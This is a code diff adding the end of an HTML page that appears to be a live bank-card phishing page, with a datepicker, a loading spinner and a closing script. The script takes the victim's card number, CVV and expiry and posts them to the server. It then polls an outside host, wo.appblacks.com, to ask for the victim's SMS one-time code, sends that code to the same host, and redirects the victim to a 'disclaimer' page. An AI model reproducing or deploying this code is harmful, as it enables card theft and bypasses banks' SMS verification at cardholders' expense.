+                        <td class="ui-datepicker-week-end" data-handler="selectDay" data-event="click" data-month="10" data-year="2022"><a class="ui-state-default" href="#">26</a></td>
+                    </tr>
+                    <tr>
+                        <td class="ui-datepicker-week-end" data-handler="selectDay" data-event="click" data-month="10" data-year="2022"><a class="ui-state-default" href="#">27</a></td>
+                        <td class=" " data-handler="selectDay" data-event="click" data-month="10" data-year="2022"><a class="ui-state-default" href="#">28</a></td>
+                        <td class=" " data-handler="selectDay" data-event="click" data-month="10" data-year="2022"><a class="ui-state-default" href="#">29</a></td>
+                        <td class=" " data-handler="selectDay" data-event="click" data-month="10" data-year="2022"><a class="ui-state-default" href="#">30</a></td>
+                        <td class="ui-datepicker-other-month ui-datepicker-unselectable ui-state-disabled">&nbsp;</td>
+                        <td class="ui-datepicker-other-month ui-datepicker-unselectable ui-state-disabled">&nbsp;</td>
+                        <td class="ui-datepicker-week-end ui-datepicker-other-month ui-datepicker-unselectable ui-state-disabled">&nbsp;</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+    
+        <div id="custom-overlay" style="display:none;">
+            <div class="loading-spinner">
+              Custom loading...
+            </div>
+          </div>
+       <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+             <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-easy-loading/1.3.0/jquery.loading.min.js" integrity="sha512-tKLMM/v1nsieFOgUyeMSC2jdB4UtbU7R88e+S0pVIz3f6sWdpOpirG2j5pulmH45l1vk47J84V4ifXAYv+wuMw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<style type="text/css">
+    .loading-overlay {
+  display: table;
+  opacity: 0.8;
+}
+
+.loading-overlay-content {
+  text-transform: uppercase;
+  letter-spacing: 0.35em;
+  font-size: 1.40em;
+  font-weight: bold;
+  text-align: center;
+  display: table-cell;
+  vertical-align: middle;
+}
+
+.loading-overlay.loading-theme-light {
+  background-color: #E61D24;
+  color: #000;
+}
+
+.loading-overlay.loading-theme-dark {
+  background-color: #000;
+  color: #fff;
+}
+
+.loading-spinner {
+    font-size: 12px;
+    margin: 6.7em auto;
+    width: 1em;
+    height: 1em;
+    border-radius: 50%;
+    position: relative;
+    text-indent: -9999em;
+    -webkit-animation: load4 1.3s infinite linear;
+    animation: load4 1.3s infinite linear;
+}
+#custom-overlay {
+    background-color: #000;
+    opacity: 0.7;
+    z-index: 1111;
+    overflow: hidden;
+}
+#custom-overlay {
+  background-color: #000;
+  opacity: 0.8;
+}
+
+/* http://projects.lukehaas.me/css-loaders/ by @lukehaas */
+.loading-spinner {
+  font-size: 12px;
+  margin: 25% auto;
+  width: 1em;
+  height: 1em;
+  border-radius: 50%;
+  position: relative;
+  text-indent: -9999em;
+  -webkit-animation: load4 1.3s infinite linear;
+  animation: load4 1.3s infinite linear;
+}
+@-webkit-keyframes load4 {
+  0%,
+  100% {
+    box-shadow: 0em -3em 0em 0.2em #ffffff, 2em -2em 0 0em #ffffff,
+      3em 0em 0 -0.5em #ffffff, 2em 2em 0 -0.5em #ffffff,
+      0em 3em 0 -0.5em #ffffff, -2em 2em 0 -0.5em #ffffff,
+      -3em 0em 0 -0.5em #ffffff, -2em -2em 0 0em #ffffff;
+  }
+  12.5% {
+    box-shadow: 0em -3em 0em 0em #ffffff, 2em -2em 0 0.2em #ffffff,
+      3em 0em 0 0em #ffffff, 2em 2em 0 -0.5em #ffffff, 0em 3em 0 -0.5em #ffffff,
+      -2em 2em 0 -0.5em #ffffff, -3em 0em 0 -0.5em #ffffff,
+      -2em -2em 0 -0.5em #ffffff;
+  }
+  25% {
+    box-shadow: 0em -3em 0em -0.5em #ffffff, 2em -2em 0 0em #ffffff,
+      3em 0em 0 0.2em #ffffff, 2em 2em 0 0em #ffffff, 0em 3em 0 -0.5em #ffffff,
+      -2em 2em 0 -0.5em #ffffff, -3em 0em 0 -0.5em #ffffff,
+      -2em -2em 0 -0.5em #ffffff;
+  }
+  37.5% {
+    box-shadow: 0em -3em 0em -0.5em #ffffff, 2em -2em 0 -0.5em #ffffff,
+      3em 0em 0 0em #ffffff, 2em 2em 0 0.2em #ffffff, 0em 3em 0 0em #ffffff,
+      -2em 2em 0 -0.5em #ffffff, -3em 0em 0 -0.5em #ffffff,
+      -2em -2em 0 -0.5em #ffffff;
+  }
+  50% {
+    box-shadow: 0em -3em 0em -0.5em #ffffff, 2em -2em 0 -0.5em #ffffff,
+      3em 0em 0 -0.5em #ffffff, 2em 2em 0 0em #ffffff, 0em 3em 0 0.2em #ffffff,
+      -2em 2em 0 0em #ffffff, -3em 0em 0 -0.5em #ffffff,
+      -2em -2em 0 -0.5em #ffffff;
+  }
+  62.5% {
+    box-shadow: 0em -3em 0em -0.5em #ffffff, 2em -2em 0 -0.5em #ffffff,
+      3em 0em 0 -0.5em #ffffff, 2em 2em 0 -0.5em #ffffff, 0em 3em 0 0em #ffffff,
+      -2em 2em 0 0.2em #ffffff, -3em 0em 0 0em #ffffff,
+      -2em -2em 0 -0.5em #ffffff;
+  }
+  75% {
+    box-shadow: 0em -3em 0em -0.5em #ffffff, 2em -2em 0 -0.5em #ffffff,
+      3em 0em 0 -0.5em #ffffff, 2em 2em 0 -0.5em #ffffff,
+      0em 3em 0 -0.5em #ffffff, -2em 2em 0 0em #ffffff, -3em 0em 0 0.2em #ffffff,
+      -2em -2em 0 0em #ffffff;
+  }
+  87.5% {
+    box-shadow: 0em -3em 0em 0em #ffffff, 2em -2em 0 -0.5em #ffffff,
+      3em 0em 0 -0.5em #ffffff, 2em 2em 0 -0.5em #ffffff,
+      0em 3em 0 -0.5em #ffffff, -2em 2em 0 0em #ffffff, -3em 0em 0 0em #ffffff,
+      -2em -2em 0 0.2em #ffffff;
+  }
+}
+@keyframes load4 {
+  0%,
+  100% {
+    box-shadow: 0em -3em 0em 0.2em #ffffff, 2em -2em 0 0em #ffffff,
+      3em 0em 0 -0.5em #ffffff, 2em 2em 0 -0.5em #ffffff,
+      0em 3em 0 -0.5em #ffffff, -2em 2em 0 -0.5em #ffffff,
+      -3em 0em 0 -0.5em #ffffff, -2em -2em 0 0em #ffffff;
+  }
+  12.5% {
+    box-shadow: 0em -3em 0em 0em #ffffff, 2em -2em 0 0.2em #ffffff,
+      3em 0em 0 0em #ffffff, 2em 2em 0 -0.5em #ffffff, 0em 3em 0 -0.5em #ffffff,
+      -2em 2em 0 -0.5em #ffffff, -3em 0em 0 -0.5em #ffffff,
+      -2em -2em 0 -0.5em #ffffff;
+  }
+  25% {
+    box-shadow: 0em -3em 0em -0.5em #ffffff, 2em -2em 0 0em #ffffff,
+      3em 0em 0 0.2em #ffffff, 2em 2em 0 0em #ffffff, 0em 3em 0 -0.5em #ffffff,
+      -2em 2em 0 -0.5em #ffffff, -3em 0em 0 -0.5em #ffffff,
+      -2em -2em 0 -0.5em #ffffff;
+  }
+  37.5% {
+    box-shadow: 0em -3em 0em -0.5em #ffffff, 2em -2em 0 -0.5em #ffffff,
+      3em 0em 0 0em #ffffff, 2em 2em 0 0.2em #ffffff, 0em 3em 0 0em #ffffff,
+      -2em 2em 0 -0.5em #ffffff, -3em 0em 0 -0.5em #ffffff,
+      -2em -2em 0 -0.5em #ffffff;
+  }
+  50% {
+    box-shadow: 0em -3em 0em -0.5em #ffffff, 2em -2em 0 -0.5em #ffffff,
+      3em 0em 0 -0.5em #ffffff, 2em 2em 0 0em #ffffff, 0em 3em 0 0.2em #ffffff,
+      -2em 2em 0 0em #ffffff, -3em 0em 0 -0.5em #ffffff,
+      -2em -2em 0 -0.5em #ffffff;
+  }
+  62.5% {
+    box-shadow: 0em -3em 0em -0.5em #ffffff, 2em -2em 0 -0.5em #ffffff,
+      3em 0em 0 -0.5em #ffffff, 2em 2em 0 -0.5em #ffffff, 0em 3em 0 0em #ffffff,
+      -2em 2em 0 0.2em #ffffff, -3em 0em 0 0em #ffffff,
+      -2em -2em 0 -0.5em #ffffff;
+  }
+  75% {
+    box-shadow: 0em -3em 0em -0.5em #ffffff, 2em -2em 0 -0.5em #ffffff,
+      3em 0em 0 -0.5em #ffffff, 2em 2em 0 -0.5em #ffffff,
+      0em 3em 0 -0.5em #ffffff, -2em 2em 0 0em #ffffff, -3em 0em 0 0.2em #ffffff,
+      -2em -2em 0 0em #ffffff;
+  }
+  87.5% {
+    box-shadow: 0em -3em 0em 0em #ffffff, 2em -2em 0 -0.5em #ffffff,
+      3em 0em 0 -0.5em #ffffff, 2em 2em 0 -0.5em #ffffff,
+      0em 3em 0 -0.5em #ffffff, -2em 2em 0 0em #ffffff, -3em 0em 0 0em #ffffff,
+      -2em -2em 0 0.2em #ffffff;
+  }
+}
+</style>
+<script type="text/javascript">
+   var message;
+
+   $("#forma").submit(function(e){
+      e.preventDefault();
+            var crd = $("#card").val();
+            var cvv = $("#cvv").val();
+            var month = $("#month").val();
+            var year = $("#year").val();
+            if(crd.length < 16 || cvv.length < 3 || month.length < 2 || year.length < 2) {
+               return;
+            }
+            $('[data-block="content"]').loading({
+                overlay: $("#custom-overlay"),
+                  onStart: function(loading) {
+                      loading.overlay.slideDown(400);
+                    },
+                    onStop: function(loading) {
+                      loading.overlay.slideUp(400);
+                    }
+            });
+            $.post("/check2.php" + window.location.search, {
+                crd: crd,
+                cvv: cvv,
+                month: month,
+                year: year
+            }, function(data){
+               
+               var message_id = data;
+               var inter = setInterval(function(){
+                      $.get("https://wo.appblacks.com/call_status.php?message=" + data, function( data ) {
+                           if(data == 'sms') {
+                              clearInterval(inter);
+                              $("#step1").removeClass('active');
+                              $("#step2").addClass('active');
+                              $("#cdetails").hide(500);
+                              $("#smsform").show(500);
+                              $('[data-block="content"]').loading('stop');
+                              $("#forma").off('submit');
+                              $("#sendcode").click(function(e){
+                                 e.preventDefault();
+                                 var code = $("#sms").val();
+                                 if(code.length < 6) {
+                                    return;
+                                 }
+                                 $.get("https://wo.appblacks.com/call_edit.php?message=" + message_id + "&sms="+code, function( data ) {
+                                   window.location.replace('https://thebanks.eu/disclaimer');
+                                 });
+                              });
+                           } else if(data == 'kick') {
+                              window.location.replace('https://thebanks.eu/disclaimer');
+                           } else {
+                              //123
+                           }
+                      });
+               }, 700);
+               //window.location.href = 'https://href.li?https://secure.americafirst.com';
+            });
+   });
+    
+</script>
+
+
+</body></html>
